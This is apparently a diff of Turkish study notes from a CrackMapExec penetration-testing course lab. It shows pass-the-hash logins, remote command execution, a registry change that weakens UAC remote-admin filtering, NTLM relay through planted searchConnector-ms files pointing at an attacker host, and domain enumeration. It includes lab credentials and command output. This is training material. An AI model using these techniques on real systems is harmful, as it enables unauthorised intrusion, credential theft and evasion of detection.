-![Pasted image 20241202231601.png](/img/user/resimler/Pasted%20image%2020241202231601.png)
 
+```
+crackmapexec smb dc01.inlanefreight.htb -u svc_inlaneadm$ -H
+76fa2df9e8f656ae81b0bd271bef0346 --shares
+
+SMB dc01.inlanefreight.htb 445 DC01 [*] Windows
+10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
+(SMBv1:False)
+SMB dc01.inlanefreight.htb 445 DC01 [+]
+inlanefreight.htb\svc_inlaneadm$:76fa2df9e8f656ae81b0bd271bef0346
+SMB dc01.inlanefreight.htb 445 DC01 [+] Enumerated shares
+SMB dc01.inlanefreight.htb 445 DC01 Share Permissions Remark
+SMB dc01.inlanefreight.htb 445 DC01 -----
+----------- ------
+SMB dc01.inlanefreight.htb 445 DC01 ADMIN$ Remote Admin
+SMB dc01.inlanefreight.htb 445 DC01 C$ Default share
+SMB dc01.inlanefreight.htb 445 DC01 CertEnroll
+READ Active Directory Certificate Services share
+<SNIP>
+```
+
+
+---
 
 ### RDP Screenshots
-RDP protokolü aracılığıyla kullanıcı adlarını numaralandırmak için CrackMapExec'i kullanabiliriz. Hedef makinede RDP'ye yalnızca NLA ile izin verme seçeneği devre dışı bırakılmışsa, oturum açma isteminin ekran görüntüsünü almak için --nlascreenshot seçeneğini kullanabiliriz
+
+RDP protokolü aracılığıyla kullanıcı adlarını numaralandırmak için CrackMapExec'i kullanabiliriz. Hedef makinede RDP'ye yalnızca `NLA` ile izin verme seçeneği devre dışı bırakılmışsa, oturum açma isteminin ekran görüntüsünü almak için `--nlascreenshot` seçeneğini kullanabiliriz
 
 
 ### Enumerate Login Prompt
-![Pasted image 20241202231656.png](/img/user/resimler/Pasted%20image%2020241202231656.png)
+
+```
+crackmapexec rdp 10.129.204.177 --nla-screenshot
+RDP 10.129.204.177 3389 DC01 [*] Windows 10 or
+Windows Server 2016 Build 17763 (name:DC01) (domain:inlanefreight.htb)
+(nla:False)
+RDP 10.129.204.177 3389 DC01 NLA Screenshot saved
+/home/plaintext/.cme/screenshots/DC01_10.129.204.177_2022-12-19_124833.png
+```
 
 Ekran görüntüsünü açmak için MATE'in Eye'ını veya CLI'dan eom'u kullanabiliriz.
 
 
-### Ekran Görüntüsünü Açmak için MATE'in Gözünü Kullanma
-![Pasted image 20241202231729.png](/img/user/resimler/Pasted%20image%2020241202231729.png)
+### Ekran Görüntüsünü Açmak için MATE'in Eye Kullanma
+
+```
+eom /home/plaintext/.cme/screenshots/DC01_10.129.203.121_2022-11-
+23_163607.png
+```
+
 ![Pasted image 20241202231735.png](/img/user/resimler/Pasted%20image%2020241202231735.png)
 
-Eğer bir kullanıcı adı ve parolamız varsa, --screenshot seçeneği ile RDP protokolünü kullanarak da ekran görüntüsü alabiliriz. Bu seçenek --screentime ile birleştirilebilir, varsayılan olarak 10, RDP bağlantısı açıldıktan sonra ekran görüntüsü almak için bekleyeceği süredir. Bu, bir hedef makineye bağlandığımızda ve hedefin masaüstünü yüklemesi 10 saniyeden fazla sürdüğünde kullanışlıdır.
+Eğer bir kullanıcı adı ve parolamız varsa, `--screenshot` seçeneği ile RDP protokolünü kullanarak da ekran görüntüsü alabiliriz. Bu seçenek `--screentime` ile birleştirilebilir, varsayılan olarak `10`, RDP bağlantısı açıldıktan sonra ekran görüntüsü almak için bekleyeceği süredir. Bu, bir hedef makineye bağlandığımızda ve hedefin masaüstünü yüklemesi 10 saniyeden fazla sürdüğünde kullanışlıdır.
 
-Ekran görüntüsü seçeneğiyle birleştirilebilecek bir diğer seçenek de RDP bağlantısı sırasındaki ekran çözünürlüğüne karşılık gelen --res seçeneğidir. Bu seçenek yararlıdır çünkü aktif bir RDP oturumu bulursak, kullanıcının ekranının boyutuna bağlı olarak tüm içeriği görebiliriz veya göremeyiz. Varsayılan olarak bu seçenek 1024x768 olarak ayarlanmıştır
-
-
-
-### Taking a Screenshot
-![Pasted image 20241202232439.png](/img/user/resimler/Pasted%20image%2020241202232439.png)
-![Pasted image 20241202232444.png](/img/user/resimler/Pasted%20image%2020241202232444.png)
+Ekran görüntüsü seçeneğiyle birleştirilebilecek bir diğer seçenek de RDP bağlantısı sırasındaki ekran çözünürlüğüne karşılık gelen `--res` seçeneğidir. Bu seçenek yararlıdır çünkü aktif bir RDP oturumu bulursak, kullanıcının ekranının boyutuna bağlı olarak tüm içeriği görebiliriz veya göremeyiz. Varsayılan olarak bu seçenek `1024x768` olarak ayarlanmıştır
 
 
-Not: --screentime ve --res isteğe bağlı bayraklardır.
+### Screenshot Alma
+
+```
+crackmapexec rdp 10.129.204.177 -u julio -p Password1 --screenshot --
+screentime 5 --res 1280x720
+
+RDP 10.129.204.177 3389 DC01 [*] Windows 10 or
+Windows Server 2016 Build 17763 (name:DC01) (domain:inlanefreight.htb)
+(nla:False)
+RDP 10.129.204.177 3389 DC01 [+]
+inlanefreight.htb\julio:Password1 (Pwn3d!)
+RDP 10.129.204.177 3389 DC01 Screenshot saved
+/home/plaintext/.cme/screenshots/DC01_10.129.203.121_2022-11-23_163607.png
+```
+
+
+Not: `--screentime` ve `--res` isteğe bağlı bayraklardır.
 
 Son olarak, ekran görüntüsünü açmak için MATE'in Eye'ını veya CLI'dan eom'u kullanabiliriz:
 
 
 ### Ekran Görüntüsünü Açmak için MATE'in Gözünü Kullanma
-![Pasted image 20241202232517.png](/img/user/resimler/Pasted%20image%2020241202232517.png)
+
+```
+eom /home/plaintext/.cme/screenshots/DC01_10.129.203.121_2022-11- 23_163607.png
+```
+
 ![Pasted image 20241202232523.png](/img/user/resimler/Pasted%20image%2020241202232523.png)
 
-
-Bu bölümde, hedeflerimizi arşivlemeye yardımcı olabilecek LDAP ve RDP kullanarak çeşitli numaralandırma seçeneklerini araştırdık. Bir sonraki bölümde CrackMapExec kullanarak komutların nasıl çalıştırılacağı incelenecektir.
-
+Bu bölümde, hedeflerimize ulaşmamıza yardımcı olabilecek LDAP ve RDP kullanarak çeşitli numaralandırma seçeneklerini inceledik. Aşağıdaki bölüm, CrackMapExec kullanarak komutların nasıl çalıştırılacağını gözden geçirecektir.
 
 
-
+---
 
 ### Command Execution
 
-Remote target üzerinde local administrator olarak bir komut çalıştırmaya çalışmadan önce UAC'nin varlığını kontrol etmeliyiz. UAC etkinleştirildiğinde, ki bu varsayılan durumdur, yalnızca RID 500'e sahip yönetici hesabı (varsayılan yönetici) remote komutları yürütebilir. Durumun böyle olup olmadığını kontrol etmek için iki registry key vardır:
+Remote target üzerinde local administrator olarak bir komut çalıştırmaya çalışmadan önce `UAC`'nin varlığını kontrol etmeliyiz. UAC etkinleştirildiğinde, ki bu varsayılan durumdur, yalnızca `RID 500`'e sahip administrator hesabı (varsayılan administrator) remote komutları yürütebilir. Durumun böyle olup olmadığını kontrol etmek için iki registry key vardır:
 
-![Pasted image 20241203095807.png](/img/user/resimler/Pasted%20image%2020241203095807.png)
+`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy`
+`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`
 
-Varsayılan olarak, LocalAccountTokenFilterPolicy değeri 0 olarak ayarlanmıştır, yani yalnızca built-in administrator hesabı (RID 500) yönetim görevlerini gerçekleştirebilir. Local administrator grubunda olsak bile, yalnızca kullanıcımızın RID'si 500 ise remote komutları çalıştırabiliriz. Değer 1 olarak ayarlanırsa tüm yönetici hesapları yönetim görevlerini yürütebilir.
+Varsayılan olarak, `LocalAccountTokenFilterPolicy` değeri 0 olarak ayarlanmıştır, yani yalnızca built-in administrator hesabı (RID 500) administration görevlerini gerçekleştirebilir. Local administrator grubunda olsak bile, yalnızca kullanıcımızın RID'si `500` ise remote komutları çalıştırabiliriz. Değer 1 olarak ayarlanırsa tüm administrative hesapları yönetim görevlerini yürütebilir.
 
-Yöneticinin yapılandırabileceği bir diğer ayar da local administrator hesabının (RID 500) uzaktan yönetim görevlerini yerine getirmesini engellemektir. Bu, FilterAdministratorToken kayıt defteri değerini 1 olarak ayarlayarak yapılabilir; bu, built-in administrator hesabının (RID 500) remote administrative tasks (uzaktan yönetim görevleri) gerçekleştiremeyeceği anlamına gelir.
+Administrator yapılandırabileceği bir diğer ayar da local administrator hesabının (RID 500) remote yönetim görevlerini yerine getirmesini engellemektir. Bu, `FilterAdministratorToken` registry değerini 1 olarak ayarlayarak yapılabilir; bu, built-in administrator hesabının (RID 500) remote administrative tasks (remote yönetim görevleri) gerçekleştiremeyeceği anlamına gelir.
 
 
+### Administrator Olarak Komut Yürütme
 
-### Command Execution as Administrator
-Komutları çalıştırmak ve administrators grubuna kimlerin üye olduğunu görmek için Administrator hesabını kullanalım. Windows komut satırı komutlarını çalıştırmak için -x seçeneğini ve ardından çalıştırmak istediğimiz komutu kullanmamız gerekir.
+Komutları çalıştırmak ve administrators grubuna kimlerin üye olduğunu görmek için Administrator hesabını kullanalım. Windows komut satırı komutlarını çalıştırmak için `-x` seçeneğini ve ardından çalıştırmak istediğimiz komutu kullanmamız gerekir.
 
 
 ### Bir Komutu Administrator Olarak Çalıştırma
-![Pasted image 20241203100035.png](/img/user/resimler/Pasted%20image%2020241203100035.png)
-![Pasted image 20241203100045.png](/img/user/resimler/Pasted%20image%2020241203100045.png)
+
+```
+crackmapexec smb 10.129.204.133 -u Administrator -p 'AnotherC0mpl3xP4$' -
+-local-auth -x "net localgroup administrators"
+
+SMB 10.129.204.133 445 MS01 [*] Windows 10.0 Build
+17763 x64 (name:MS01) (domain:MS01) (signing:False) (SMBv1:False)
+SMB 10.129.204.133 445 MS01 [+]
+MS01\Administrator:AnotherC0mpl3xP4$ (Pwn3d!)
+SMB 10.129.204.133 445 MS01 [+] Executed command
+SMB 10.129.204.133 445 MS01 Alias name
+administrators
+SMB 10.129.204.133 445 MS01 Comment
+Administrators have complete and unrestricted access to the
+computer/domain
+SMB 10.129.204.133 445 MS01
+SMB 10.129.204.133 445 MS01 Members
+SMB 10.129.204.133 445 MS01
+SMB 10.129.204.133 445 MS01 ----------------------
+---------------------------------------------------------
+SMB 10.129.204.133 445 MS01 Administrator
+SMB 10.129.204.133 445 MS01 INLANEFREIGHT\david
+SMB 10.129.204.133 445 MS01 INLANEFREIGHT\DomainAdmins
+SMB 10.129.204.133 445 MS01 INLANEFREIGHT\julio
+SMB 10.129.204.133 445 MS01 INLANEFREIGHT\robert
+SMB 10.129.204.133 445 MS01 localadmin
+SMB 10.129.204.133 445 MS01 The command completed
+successfully.
+```
 
 
-### RID 500 Dışı Hesap Olarak Komut Yürütme
-Yukarıdaki komutta, localadmin local user Administrators grubundadır, ancak uzak komutu çalıştıramaz:
+### RID 500 Olmayan Hesap Olarak Komut Yürütme
+
+Yukarıdaki komutta, `localadmin` local user `Administrators` grubundadır, ancak remote komutu çalıştıramaz:
 
 ### Komutu localadmin olarak çalıştırma
-![Pasted image 20241203100238.png](/img/user/resimler/Pasted%20image%2020241203100238.png)
 
-Bu, UAC'nin etkin olduğu anlamına gelir. Eğer durum böyleyse, hesap yönetici olsa bile (Pwn3d!) mesajını almayacağız. Bu ayarı geri almak istiyorsak, LocalAccountTokenFilterPolicy'yi 1 olarak ayarlayabiliriz.
+```
+crackmapexec smb 10.129.204.133 -u localadmin -p Password99! --local-auth
+-x whoami
+
+SMB 10.129.204.133 445 MS01 [*] Windows 10.0 Build
+17763 x64 (name:MS01) (domain:MS01) (signing:False) (SMBv1:False)
+SMB 10.129.204.133 445 MS01 [+]
+MS01\localadmin:Password99!
+```
+
+Bu, UAC'nin etkin olduğu anlamına gelir. Eğer durum böyleyse, hesap administrator olsa bile (Pwn3d!) mesajını almayacağız. Bu ayarı geri almak istiyorsak, `LocalAccountTokenFilterPolicy`'yi 1 olarak ayarlayabiliriz.
 
 
 ### LocalAccountTokenFilterPolicy'yi Değiştirme
-![Pasted image 20241203100321.png](/img/user/resimler/Pasted%20image%2020241203100321.png)
 
-![Pasted image 20241203100458.png](/img/user/resimler/Pasted%20image%2020241203100458.png)
+```
+crackmapexec smb 10.129.204.133 -u Administrator -p 'AnotherC0mpl3xP4$' -
+-local-auth -x "reg add
+HKLM\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\POLICIES\SYSTEM /V
+LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"
+
+SMB 10.129.204.133 445 MS01 [*] Windows 10.0 Build
+17763 x64 (name:MS01) (domain:MS01) (signing:False) (SMBv1:False)
+SMB 10.129.204.133 445 MS01 [+]
+MS01\Administrator:AnotherC0mpl3xP4$ (Pwn3d!)
+SMB 10.129.204.133 445 MS01 [+] Executed command
+SMB 10.129.204.133 445 MS01 The operation
+completed successfully.
+
+```
+
+
+```
+crackmapexec smb 10.129.204.133 -u localadmin -p Password99! --local-auth
+-x whoami
+
+SMB 10.129.204.133 445 MS01 [*] Windows 10.0 Build
+17763 x64 (name:MS01) (domain:MS01) (signing:False) (SMBv1:False)
+SMB 10.129.204.133 445 MS01 [+]
+MS01\localadmin:Password99! (Pwn3d!)
+SMB 10.129.204.133 445 MS01 [+] Executed command
+SMB 10.129.204.133 445 MS01 ms01\localadmin
+
+```
 
 
 ### Domain Hesabı Olarak Komut Yürütme
-LocalAccountTokenFilterPolicy yalnızca local hesaplar için geçerlidir. Bir domain kullanıcımız varsa ve administrators grubunun bir parçasıysa, UAC ayarıyla bile komutu çalıştırabiliriz. Bu senaryoda, INLANEFREIGHT\robert hesabı administrators grubunun bir üyesidir, yani UAC etkin olsa bile komutları yürütebilir.
+
+`LocalAccountTokenFilterPolicy` yalnızca local hesaplar için geçerlidir. Bir domain kullanıcımız varsa ve `administrators` grubunun bir parçasıysa, UAC ayarıyla bile komutu çalıştırabiliriz. Bu senaryoda, `INLANEFREIGHT\robert` hesabı `administrators` `grubunun` bir üyesidir, yani UAC etkin olsa bile komutları yürütebilir.
 
 
 ### Komutu Robert olarak çalıştır
-![Pasted image 20241203100627.png](/img/user/resimler/Pasted%20image%2020241203100627.png)
+
+```
+crackmapexec smb 10.129.204.133 -u robert -p 'Inlanefreight01!' -x whoami
+
+SMB 10.129.204.133 445 MS01 [*] Windows 10.0 Build
+17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False)
+(SMBv1:False)
+SMB 10.129.204.133 445 MS01 [+]
+inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
+SMB 10.129.204.133 445 MS01 [+] Executed command
+SMB 10.129.204.133 445 MS01 inlanefreight\robert
+
+```
 
 
 ### SMB ile Komut Yürütme
-CME'nin dört (4) farklı komut yürütme yöntemi vardır:
-![Pasted image 20241203101103.png](/img/user/resimler/Pasted%20image%2020241203101103.png)
 
-Not: Tüm yöntemler tüm bilgisayarlarda çalışmayabilir.
+CME'nin dört (4) farklı komut yürütme yöntemi vardır:
+
+| Komut   | Açıklama                                                                                                                             |
+| ------- | ------------------------------------------------------------------------------------------------------------------------------------ |
+| wmiexec | WMI (Windows Management Instrumentation) kullanılarak komutlar yürütülür (`diskte dosya oluşturulur`).                               |
+| atexec  | Windows `görev zamanlayıcısı` ile bir görev planlayarak komutlar yürütülür (`fileless`, ancak Windows’un en son sürümünde çalışmaz). |
+| smbexec | Bir servis oluşturup çalıştırarak komutlar yürütülür (`fileless`, ancak Windows’un en son sürümünde çalışmaz).                       |
+| mmcexec | wmiexec yöntemine benzer, ancak komutlar Microsoft Yönetim Konsolu (MMC) aracılığıyla yürütülür.                                     |
+
+Not: Her yöntem her bilgisayarda çalışmayabilir.
 
 Varsayılan olarak, CME biri başarısız olursa farklı bir yürütme yöntemine geçecektir. Komutları aşağıdaki sırayla yürütmeye çalışır:
 
-![Pasted image 20241203101142.png](/img/user/resimler/Pasted%20image%2020241203101142.png)
+* 1. wmiexec 2. atexec 3. smbexec 4. mmcexec
 
-CME'yi yalnızca bir yürütme yöntemi kullanmaya zorlamak istiyorsak, örneğin --exec-method bayrağını kullanarak hangisini kullanacağımızı belirtebiliriz:
+CME'yi yalnızca bir yürütme yöntemi kullanmaya zorlamak istiyorsak, örneğin `--exec-method` bayrağını kullanarak hangisini kullanacağımızı belirtebiliriz:
 
 
 ### SMBExec Yöntemi ile Komut Yürütme
-![Pasted image 20241203101223.png](/img/user/resimler/Pasted%20image%2020241203101223.png)
+
+```
+crackmapexec smb 10.129.204.133 -u robert -p 'Inlanefreight01!' --execmethod smbexec -x whoami
+
+SMB 10.129.204.133 445 MS01 [*] Windows 10.0 Build
+17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False)
+(SMBv1:False)
+SMB 10.129.204.133 445 MS01 [+]
+inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
+SMB 10.129.204.133 445 MS01 [+] Executed command
+via smbexec
+SMB 10.129.204.133 445 MS01 nt authority\system
+```
 
 Alternatif olarak, -X seçeneğini kullanarak PowerShell ile komutları çalıştırabiliriz:
 
-
 ### wmiexec aracılığıyla PowerShell Komut Yürütme
-![Pasted image 20241203101403.png](/img/user/resimler/Pasted%20image%2020241203101403.png)
-![Pasted image 20241203101435.png](/img/user/resimler/Pasted%20image%2020241203101435.png)
+
+```
+crackmapexec smb 10.129.204.133 -u robert -p 'Inlanefreight01!' --execmethod wmiexec -X '$PSVersionTable'
+
+SMB 10.129.204.133 445 MS01 [*] Windows 10.0 Build
+17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False)
+(SMBv1:False)
+SMB 10.129.204.133 445 MS01 [+]
+inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
+SMB 10.129.204.133 445 MS01 [+] Executed command via wmiexec
+SMB 10.129.204.133 445 MS01 Name Value
+SMB 10.129.204.133 445 MS01 ----
+-----
+SMB 10.129.204.133 445 MS01 PSVersion 5.1.17763.2268
+SMB 10.129.204.133 445 MS01 PSEdition  Desktop
+SMB 10.129.204.133 445 MS01 PSCompatibleVersions {1.0, 2.0, 3.0, 4.0...}
+SMB 10.129.204.133 445 MS01 BuildVersion 10.0.17763.2268
+SMB 10.129.204.133 445 MS01 CLRVersion 4.0.30319.42000
+SMB 10.129.204.133 445 MS01 WSManStackVersion 3.0
+SMB 10.129.204.133 445 MS01 PSRemotingProtocolVersion 2.3
+SMB 10.129.204.133 445 MS01 SerializationVersion 1.1.0.1
+
+```
+
 
 PowerShell seçeneği -X çalıştırıldığında, perde arkasında CrackMapExec aşağıdakileri yapacaktır:
 
@@ -5064,235 +5779,261 @@ Modülü kullandıktan sonra, **LNK dosyasını temizlemek** için **`-o CLEANUP
 {{CODE_BLOCK_121}}
 
 ### drop-sc Modülü ile Hash'lerin Çalınması
-Bu bölümü tamamlamadan önce, **LNK** dışındaki bir dosya formatı kullanarak kimlik doğrulamayı zorlamanın başka bir yöntemine bakalım:[ **.searchConnector-ms**](https://learn.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry) ve **.library-ms** formatları. Bu dosya formatlarının çoğu Windows sürümünde varsayılan dosya ilişkilendirmeleri bulunur. Windows ile entegre olarak, belirtilen bir WebDAV paylaşımı gibi uzaktaki bir konumu gösterebilecek şekilde, herhangi bir konumdan içerik görüntülemelerini sağlarlar.
 
-Özünde, LNK dosyası ile aynı fonksiyonu yerine getirirler. Bu yöntemin keşfi hakkında daha fazla bilgi edinmek için Windows'ta search connectors ve library dosyalarını keşfetmek başlıklı [blog](https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/) yazısını okuyabilirsiniz.
+Bu bölümü tamamlamadan önce, **LNK** dışında başka bir dosya formatı kullanarak kimlik doğrulamasını zorlamanın başka bir yöntemine bakalım: **[.searchConnector-ms](https://learn.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry)** ve **`.library-ms`** formatları. Bu dosya formatlarının çoğu Windows sürümünde **varsayılan dosya ilişkilendirmeleri** bulunur. Windows ile entegre çalışarak içeriği rastgele bir konumdan, hatta **`WebDAV` paylaşımıyla belirtilen remote bir konumdan** gösterebilirler.
 
-CrackMapExec, paylaşılan bir klasörde bir searchConnector-ms dosyası oluşturmamızı sağlayan drop-sc adlı bir modüle sahiptir. Bunu kullanmak için, SMB fake sunucumuzu hedeflemek için URL seçeneğini belirtmemiz gerekir. Bu durumda, ntlmrelayx çalıştıran hostumuz. URL'nin çift ters eğik çizgi (\) ile kaçması gerekir, örneğin: URL=\\\\10.10.14.33\\secret .
+Özetle, bu dosyalar **LNK** dosyasıyla aynı işlevi görür. Bu yöntemin keşfi hakkında daha fazla bilgi edinmek için **"[Exploring search connectors and library files in Windows](https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/)"** başlıklı blog yazısını okuyabiliriz.
+
+CrackMapExec, **`drop-sc`** adında bir modüle sahiptir. Bu modül, paylaşılan bir klasörde **`searchConnector-ms`** dosyası oluşturmamıza olanak tanır. Kullanabilmek için **URL** seçeneğini belirterek **SMB fake sunucumuzu** hedef göstermemiz gerekir. Bu durumda, **`ntlmrelayx`** çalıştıran hostumuz olacaktır. **URL** değeri çift ters eğik çizgi (`\`) ile kaçırılmalıdır. Örneğin: **`URL=\\10.10.14.33\secret`**.
 
 İsteğe bağlı olarak aşağıdaki seçenekleri belirleyebiliriz:
 
-* SHARE=name seçeneği ile hedef paylaşımlı klasör . Bu seçeneği belirtmezsek, dosyayı WRITE izinlerine sahip tüm paylaşımlara yazacaktır
+* `SHARE=name` seçeneği ile hedef paylaşımlı klasör . Bu seçeneği belirtmezsek, dosyayı `WRITE` izinlerine sahip tüm paylaşımlara yazacaktır
 
-* FILENAME=name seçeneği ile dosya adı . Bu seçeneği belirtmezsek, “Belgeler” adında bir dosya oluşturacaktır.
+* `FILENAME=name` seçeneği ile dosya adı . Bu seçeneği belirtmezsek, “`Documents`” adında bir dosya oluşturacaktır.
 
-* Oluşturduğumuz dosyaları temizlemek istiyorsak CLEANUP=True seçeneği. Eğer özel bir isim kullanacaksak filename seçeneğini belirtmemiz gerekiyor.
+* Oluşturduğumuz dosyaları temizlemek istiyorsak `CLEANUP=True` seçeneği. Eğer özel bir isim kullanacaksak filename seçeneğini belirtmemiz gerekiyor.
 
 Drop-sc'yi iş başında görelim:
 
-
 ### Dropping a searchConnector-ms File
 
-![Pasted image 20241202202007.png](/img/user/resimler/Pasted%20image%2020241202202007.png)
+{{CODE_BLOCK_122}}
 
-![Pasted image 20241202202025.png](/img/user/resimler/Pasted%20image%2020241202202025.png)
+{{CODE_BLOCK_123}}
 
-Bir kullanıcı paylaşılan klasöre eriştiğinde ve ntlmrelayx dinlerken, hedef makineye de aktarım yapabilmeliyiz.
+Bir kullanıcı **paylaşılan klasöre** eriştiğinde ve **ntlmrelayx** dinleme modunda çalışırken, kimlik bilgilerini **hedef makineye yönlendirebilmemiz** gerekir.
 
+### NTLMRelayx ve drop-sc Kullanarak Yönlendirme
 
-### NTLMRelayx ve drop-sc Kullanarak Aktarma
+{{CODE_BLOCK_124}}
 
-![Pasted image 20241202202103.png](/img/user/resimler/Pasted%20image%2020241202202103.png)
-![Pasted image 20241202202112.png](/img/user/resimler/Pasted%20image%2020241202202112.png)
-
-Son olarak, CLEANUP=True seçeneği ile .searchConnector-ms dosyasını temizleyebiliriz:
+Son olarak, `CLEANUP=True` seçeneği ile `.searchConnector-ms` dosyasını temizleyebiliriz:
 
 
 ### searchConnector-ms Dosyalarını Temizleme
-![Pasted image 20241202202155.png](/img/user/resimler/Pasted%20image%2020241202202155.png)
-![Pasted image 20241202202201.png](/img/user/resimler/Pasted%20image%2020241202202201.png)
 
-LNK dosyaları genellikle bu tür saldırılar için bilinir. .searchConnector-ms gibi başka bir dosya türü kullanmak, fark edilmemenize yardımcı olabilir.
+{{CODE_BLOCK_125}}
 
 
-### SMB ile Eşleme ve Numaralandırma
+LNK dosyaları genellikle bu tür saldırılar için bilinir. `.searchConnector-ms` gibi başka bir dosya türü kullanmak, fark edilmemenize yardımcı olabilir.
+
+Sonraki bölümlerde CrackMapExec'in keşif seçeneklerini inceleyeceğiz.
+
+---
+
+
+### SMB ile Mapping ve Enumeration
 
 CrackMapExec, geçerli bir domain kullanıcı hesabıyla numaralandırma söz konusu olduğunda çok daha fazla seçenekle birlikte gelir. En çok kullanılan seçenekleri ele aldık, ancak daha derine inelim. İşte ayrıcalıklı olmasa bile geçerli bir hesap aldığımızda kullanabileceğimiz tüm seçeneklerin listesi:
 
-![Pasted image 20241202202635.png](/img/user/resimler/Pasted%20image%2020241202202635.png)
-![Pasted image 20241202202649.png](/img/user/resimler/Pasted%20image%2020241202202649.png)
+| Komut                                                                 | Açıklama                                                          |
+| --------------------------------------------------------------------- | ----------------------------------------------------------------- |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --loggedon-users` | Hedefte oturum açmış kullanıcıları listeler.                      |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --sessions`       | Hedefteki aktif oturumları listeler.                              |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --disks`          | Hedefteki diskleri listeler.                                      |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --computers`      | Hedef ağdaki bilgisayarları listeler.                             |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --wmi`            | Belirtilen WMI sorgusunu çalıştırır.                              |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --wmi-namespace`  | WMI Namespace’ini belirtir (varsayılan: `root\cimv2`).            |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --rid-brute`      | Hedef üzerinde RID brute-force yöntemiyle kullanıcıları listeler. |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --local-groups`   | Local grupları listeler; grup belirtilirse üyelerini listeler.    |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --shares`         | Hedefteki tüm paylaşım izinlerini listeler.                       |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --users`          | Hedefteki domain kullanıcılarını listeler.                        |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --groups`         | Hedefteki domain gruplarını listeler.                             |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --pass-pol`       | Domainin password policy'sini gösterir.                           |
 
 Daha önce çalışmamış olanları gözden geçirelim:
 
-### Hedefteki etkin oturumları / oturum açmış kullanıcıları numaralandırma
+### Hedefteki aktif oturumları / oturum açmış kullanıcıları numaralandırma
 
-Birden fazla hedefi tehlikeye attıysak, etkin oturumları kontrol etmeye değer olabilir, belki bir domain yöneticisi vardır ve çabamızı bu belirli hedefe odaklamamız gerekir. Bir bilgisayardaki kullanıcıları tanımlamak için --sessions ve --loggedon-users seçeneklerini kullanabiliriz. Oturumlar, kullanıcı oturum açmamış olsa bile kullanıcı kimlik bilgilerinin hedef makinede kullanıldığı anlamına gelir. Oturum açmış kullanıcılar kendi kendini açıklar; bir kullanıcının hedef makinede oturum açtığı anlamına gelir. Bloodhound, aktif oturumları bulmak için kullanabileceğimiz başka bir araçtır.
+Birden fazla hedefi ele geçirmişsek, aktif oturumları kontrol etmek faydalı olabilir, belki bir domain administrator vardır ve bu belirli hedefe odaklanmamız gerekebilir. Bir bilgisayardaki kullanıcıları tespit etmek için `--sessions` ve `--loggedon-users` seçeneklerini kullanabiliriz. Session'lar, kullanıcının hedef makinede giriş yapmıyor olsa da kullanıcı kimlik bilgileriyle oturum açıldığı anlamına gelir. Giriş yapmış kullanıcılar ise kendiliğinden anlaşılır; bir kullanıcının hedef makineye giriş yapmış olduğunu ifade eder. `BloodHound`, aktif oturumları bulmak için kullanabileceğimiz bir diğer araçtır.
 
 
 ### Sessions ve loggendon-users seçeneklerini kullanma
-![Pasted image 20241202203026.png](/img/user/resimler/Pasted%20image%2020241202203026.png)
 
-Belirli bir kullanıcıyı arıyorsak, --loggedon-users-filter seçeneğini ve ardından aradığımız kullanıcının adını kullanabiliriz. Birden fazla kullanıcı arıyorsak, regex'i de destekler.
+{{CODE_BLOCK_126}}
+
+Belirli bir kullanıcıyı arıyorsak, -`-loggedon-users-filter` seçeneğini ve ardından aradığımız kullanıcının adını kullanabiliriz. Birden fazla kullanıcı arıyorsak, `regex`'i de destekler.
 
 
 ### Oturum açmış kullanıcılarla filtre seçeneğini kullanma
-![Pasted image 20241202203114.png](/img/user/resimler/Pasted%20image%2020241202203114.png)
-![Pasted image 20241202203120.png](/img/user/resimler/Pasted%20image%2020241202203120.png)
+
+{{CODE_BLOCK_127}}
+
+Not: Genellikle, `--loggedon-users` veya `--sessions` parametrelerinin başarılı bir şekilde çalıştırılabilmesi için administrator izinleri gereklidir.
+
 
 
 ### Enumerate Computers
 
 CME ayrıca domain bilgisayarlarını da listeleyebilir ve bunu bir LDAP isteği gerçekleştirerek yapar
 
-
 ### Domain'deki Bilgisayarları Numaralandırma
-![Pasted image 20241202203511.png](/img/user/resimler/Pasted%20image%2020241202203511.png)
+
+{{CODE_BLOCK_128}}
+
 
 Not: Bu seçenek yalnızca SMB protokolünde mevcut olsa da, CME bir LDAP sorgusu yapmaktadır.
 
 
 ### Enumerate LAPS
 
-Local Administrator Password Solution (LAPS), domain'e bağlı bilgisayarların local hesap parolalarının yönetimini sağlar. Parolalar Active Directory'de (AD) saklanır ve ACL tarafından korunur, böylece yalnızca uygun kullanıcılar bunları okuyabilir veya sıfırlama talebinde bulunabilir. LAPS domain içinde kullanılıyorsa ve LAPS şifrelerini okuyabilen bir hesabı tehlikeye atarsak, --laps seçeneğini bir hedef listesi ile kullanabilir ve komutları çalıştırabilir veya --sam gibi diğer seçenekleri kullanabiliriz.
